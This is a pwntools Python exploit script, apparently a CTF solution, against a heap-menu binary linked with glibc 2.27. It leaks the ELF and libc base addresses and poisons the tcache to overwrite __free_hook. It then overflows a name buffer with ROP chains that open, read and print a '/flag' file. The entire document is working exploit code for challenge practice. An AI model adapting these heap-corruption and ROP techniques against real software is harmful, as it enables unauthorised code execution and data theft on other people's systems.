from pwn import *
from pwn import p64,u64

context.arch = 'amd64' # CPU平台
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h'] # tmux调试窗口

# elf = ELF('./')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')
# libc = ELF('/home/unravel/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so') #local


io = process('./pwn')

def add(size,idx, content):
    io.sendlineafter('4: edit\n','1')
    io.sendlineafter("size\n",str(size))
    io.sendlineafter('index\n',str(idx))
    io.sendlineafter('content:\n', content)

def delete(idx):
    io.sendlineafter('4: edit\n','2')
    io.sendlineafter('index\n', str(idx))

def show(idx):
    io.sendlineafter('4: edit\n','3')
    io.sendlineafter('index\n', str(idx))

def edit(idx, content):
    io.sendlineafter('4: edit\n','4')
    io.sendlineafter('index\n',str(idx))
    io.sendafter('content:\n',content)

name = 'a'*24
io.sendafter('input your name\n', name)
io.recvuntil(b'a'*24)
elf_addr = u64(io.recv(6).ljust(8,b'\x00'))
info(hex(elf_addr))
elf_base = elf_addr - 0xbc3
info(hex(elf_base))
hello = elf_base + 0xbc6

add(0x410,0,b'A'*8)
add(0x68,1,b'B'*8)
add(0x68,2,b'B'*8)
add(0x68,3,b'B'*8)
add(0x68,4,b'B'*8)
add(0x68,5,b'B'*8)
add(0x68,6,b'B'*8)
add(0x68,7,b'B'*8)
add(0x68,8,b'B'*8)
add(0x68,9,b'B'*8)
add(0x68,10,b'B'*8)

delete(0)
gdb.attach(io)
show(0)
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
info('main_arena+96: 0x%x',leak)

malloc_hook = leak - 96 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
info('libc_base: 0x%x',libc_base)
info('malloc_hook: 0x%x',malloc_hook)
info('free_hook: 0x%x',free_hook)
delete(2)
delete(1)

edit(2, p64(free_hook))
add(0x68,11,p64(hello)*4)
add(0x68,12,p64(hello)*4)
add(0x68,13,p64(hello)*4)

info('free_hook: 0x%x',free_hook)
io.sendlineafter('4: edit\n','2')
io.sendlineafter('index\n','3')

prsi = libc_base + 0x23a6a #: pop rsi ; ret
prdi = libc_base + 0x2164f #: pop rdi ; ret
prdx = libc_base + 0x1b96 #: pop rdx ; ret
openat = libc_base + libc.sym['openat']
open_func = libc_base + libc.sym['open']
write = libc_base + libc.sym['write']
read = libc_base + libc.sym['read']
puts = libc_base + libc.sym['puts']
bss = elf_base + 0x202090

payload = p64(prdi) + p64(0)
payload += p64(prsi) + p64(bss)
payload += p64(prdx) + p64(20)
payload += p64(read) + p64(hello)
io.sendafter('name\n',b'A'*0x28+payload)

sleep(0.5)
#gdb.attach(io, 'b *$rebase(0xe3b)')
io.send('/flag\x00')

payload = p64(prdi) + p64(bss)
payload += p64(prsi) + p64(0)
payload += p64(open_func) + p64(hello)
io.sendafter('name\n',b'A'*0x28+payload)

payload = p64(prdi) + p64(3)
payload += p64(prsi) + p64(bss)
payload += p64(prdx) + p64(50)
payload += p64(read) + p64(hello)
io.sendafter('name\n',b'A'*0x28+payload)

payload = p64(prdi) + p64(bss)
payload += p64(puts) + p64(hello)
io.sendafter('name\n',b'A'*0x28+payload)



io.interactive()

